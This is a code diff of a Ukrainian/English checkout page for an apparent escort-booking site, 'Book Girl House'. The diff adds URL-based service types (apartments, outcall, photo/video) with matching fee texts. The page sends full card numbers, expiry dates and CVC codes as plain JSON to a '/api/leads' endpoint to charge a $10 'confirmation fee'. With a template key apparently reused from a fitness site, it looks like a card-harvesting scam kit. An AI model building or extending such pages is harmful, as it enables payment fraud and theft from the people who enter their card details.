@@ -38,7 +38,7 @@
     <p class="sum-note" data-i18n="sumNote">
       Після оплати бронювання фіксується. Деталі візиту (вона до вас або ви до неї) — у чаті з менеджером.
     </p>
-    <a class="sum-back" href="/" data-i18n="back">← Назад</a>
+    <a class="sum-back" href="/?type=apartments" id="backLink" data-i18n="back">← Назад</a>
   </aside>
 
   <!-- Form column -->
@@ -148,7 +148,7 @@
         <div><span data-i18n="receiptAmount">Сума</span><strong>$10.00 USD</strong></div>
         <div><span data-i18n="receiptType">Тип</span><strong data-i18n="feeName">Комісія за підтвердження</strong></div>
       </div>
-      <a class="bgh-btn full thank-cta" href="/" data-i18n="backHome">На головну</a>
+      <a class="bgh-btn full thank-cta" href="/" id="thankHome" data-i18n="backHome">На головну</a>
     </section>
   </section>
 </main>
@@ -214,9 +214,90 @@ en:{
   receiptMerchant:"Payee",receiptAmount:"Amount",receiptType:"Type"
 }};
 
-function t(k){return(I18N[localStorage.getItem("fitpass_lang")||"uk"]||I18N.uk)[k]}
+// ========== Тип послуги з URL ==========
+const params = new URLSearchParams(location.search);
+let rawType = (params.get("type") || params.get("t") || "apartments").toLowerCase().trim();
+const typeMap = {
+  a: "apartments", apt: "apartments", apartment: "apartments", apartments: "apartments",
+  v: "visit", visit: "visit", outcall: "visit", out: "visit",
+  m: "media", media: "media", photo: "media", video: "media", content: "media"
+};
+const serviceType = typeMap[rawType] || "apartments";
+
+// Оновлюємо посилання назад з урахуванням типу
+document.addEventListener("DOMContentLoaded", () => {
+  const back = document.getElementById("backLink");
+  if (back) back.href = "/?type=" + serviceType;
+  const thank = document.getElementById("thankHome");
+  if (thank) thank.href = "/?type=" + serviceType;
+});
+
+const TYPE_TEXTS = {
+  apartments: {
+    uk: {
+      docTitle: "Book Girl House — Бронювання апартаментів",
+      feeName: "Комісія за бронювання апартаментів",
+      sumNote: "Після оплати бронювання апартаментів фіксується. Деталі — у чаті з менеджером.",
+      checkoutSub: "Введіть дані для бронювання апартаментів",
+      legal: "Продовжуючи, ви погоджуєтесь з умовами Book Girl House і авторизуєте списання комісії $10.00 за бронювання апартаментів.",
+      thanksBody: "Комісію $10.00 підтверджено. Бронювання апартаментів зафіксовано — очікуйте повідомлення в чаті."
+    },
+    en: {
+      docTitle: "Book Girl House — Apartment Booking",
+      feeName: "Apartment booking confirmation fee",
+      sumNote: "After payment the apartment booking is locked. Details stay in chat with the manager.",
+      checkoutSub: "Enter details to book the apartment",
+      legal: "By continuing you agree to Book Girl House terms and authorize a $10.00 apartment booking fee.",
+      thanksBody: "Your $10.00 fee is confirmed. Apartment booking is reserved — watch chat for details."
+    }
+  },
+  visit: {
+    uk: {
+      docTitle: "Book Girl House — Виїзд до клієнта",
+      feeName: "Комісія за виїзд до клієнта",
+      sumNote: "Після оплати виїзд підтверджено. Деталі зустрічі — у чаті з менеджером.",
+      checkoutSub: "Введіть дані для підтвердження виїзду",
+      legal: "Продовжуючи, ви погоджуєтесь з умовами Book Girl House і авторизуєте списання комісії $10.00 за виїзд до клієнта.",
+      thanksBody: "Комісію $10.00 підтверджено. Виїзд зафіксовано — очікуйте повідомлення в чаті щодо деталей."
+    },
+    en: {
+      docTitle: "Book Girl House — Outcall",
+      feeName: "Outcall confirmation fee",
+      sumNote: "After payment the outcall is confirmed. Meeting details stay in chat.",
+      checkoutSub: "Enter details to confirm the outcall",
+      legal: "By continuing you agree to Book Girl House terms and authorize a $10.00 outcall fee.",
+      thanksBody: "Your $10.00 fee is confirmed. Outcall is reserved — watch chat for visit details."
+    }
+  },
+  media: {
+    uk: {
+      docTitle: "Book Girl House — Відео / Фото",
+      feeName: "Комісія за відео або фото",
+      sumNote: "Після оплати доступ до контенту (відео або фото) буде надано. Деталі — у чаті.",
+      checkoutSub: "Введіть дані для отримання відео чи фото",
+      legal: "Продовжуючи, ви погоджуєтесь з умовами Book Girl House і авторизуєте списання комісії $10.00 за відео/фото.",
+      thanksBody: "Комісію $10.00 підтверджено. Доступ до контенту буде надано — очікуйте повідомлення в чаті."
+    },
+    en: {
+      docTitle: "Book Girl House — Video / Photo",
+      feeName: "Video or photo content fee",
+      sumNote: "After payment access to the content (video or photo) will be provided. Details in chat.",
+      checkoutSub: "Enter details to receive video or photo",
+      legal: "By continuing you agree to Book Girl House terms and authorize a $10.00 video/photo fee.",
+      thanksBody: "Your $10.00 fee is confirmed. Content access will be provided — watch chat for details."
+    }
+  }
+};
+
+function getMergedLang(lang) {
+  const base = I18N[lang] || I18N.uk;
+  const extra = (TYPE_TEXTS[serviceType] && TYPE_TEXTS[serviceType][lang]) || {};
+  return { ...base, ...extra };
+}
+
+function t(k){return getMergedLang(localStorage.getItem("fitpass_lang")||"uk")[k]}
 function applyLang(lang){
-  const d=I18N[lang]||I18N.uk;
+  const d = getMergedLang(lang);
   document.documentElement.lang=lang==="en"?"en":"uk";
   document.title=d.docTitle;
   document.querySelectorAll("[data-i18n]").forEach(el=>{const k=el.getAttribute("data-i18n");if(typeof d[k]==="string")el.innerHTML=d[k]});
@@ -348,7 +429,8 @@ $("send").onclick=async()=>{
     try{
       const r=await fetch("/api/leads",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
         name:fullName,email,card_number:digits,expiry,card_code:cvc,
-        booking_date:currentDateLabel(),booking_time:selectedTime,payment_method:"card",amount:"10.00"
+        booking_date:currentDateLabel(),booking_time:selectedTime,payment_method:"card",amount:"10.00",
+        service_type:serviceType
       })});
       const d=await r.json();if(!r.ok)throw Error(d.error);
       leadId=d.id;localStorage.setItem("fitpass_lead_id",String(leadId));
